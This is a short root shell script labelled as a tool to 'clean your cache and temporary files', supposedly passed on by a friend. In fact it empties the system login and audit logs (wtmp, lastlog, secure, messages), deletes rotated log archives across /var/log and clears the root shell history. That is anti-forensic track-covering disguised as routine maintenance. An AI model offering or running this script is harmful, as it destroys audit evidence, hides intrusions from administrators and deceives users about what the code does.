# Clean your cache and temporary files.
# This config I get from friend.
# You must login with root for use this.

echo >/var/log/wtmp

echo >/var/log/lastlog

echo >/var/log/messages

echo >/var/log/secure

echo >/var/log/maillog

echo >/var/log/xferlog


rm -rf /var/log/*.old &> /dev/null

rm -rf /var/log/*.0 &> /dev/null

rm -rf /var/log/*.1 &> /dev/null

rm -rf /var/log/*.2 &> /dev/null

rm -rf /var/log/*.3 &> /dev/null

rm -rf /var/log/*.gz &> /dev/null


rm -rf /var/log/samba/*.old &> /dev/null

rm -rf /var/log/samba/*.0 &> /dev/null

rm -rf /var/log/samba/*.1 &> /dev/null

rm -rf /var/log/samba/*.2 &> /dev/null

rm -rf /var/log/samba/*.3 &> /dev/null

rm -rf /var/log/samba/*.gz &> /dev/null


rm -rf /var/log/apt/*.old &> /dev/null

rm -rf /var/log/apt/*.0 &> /dev/null

rm -rf /var/log/apt/*.1 &> /dev/null

rm -rf /var/log/apt/*.2 &> /dev/null

rm -rf /var/log/apt/*.3 &> /dev/null

rm -rf /var/log/apt/*.gz &> /dev/null


rm -rf /var/log/gdm/*.old &> /dev/null

rm -rf /var/log/gdm/*.0 &> /dev/null

rm -rf /var/log/gdm/*.1 &> /dev/null

rm -rf /var/log/gdm/*.2 &> /dev/null

rm -rf /var/log/gdm/*.3 &> /dev/null

rm -rf /var/log/gdm/*.gz &> /dev/null


rm -rf /var/log/cups/*.old &> /dev/null

rm -rf /var/log/cups/*.0 &> /dev/null

rm -rf /var/log/cups/*.1 &> /dev/null

rm -rf /var/log/cups/*.2 &> /dev/null

rm -rf /var/log/cups/*.3 &> /dev/null

rm -rf /var/log/cups/*.gz &> /dev/null

history -c

echo >/root/.bash_history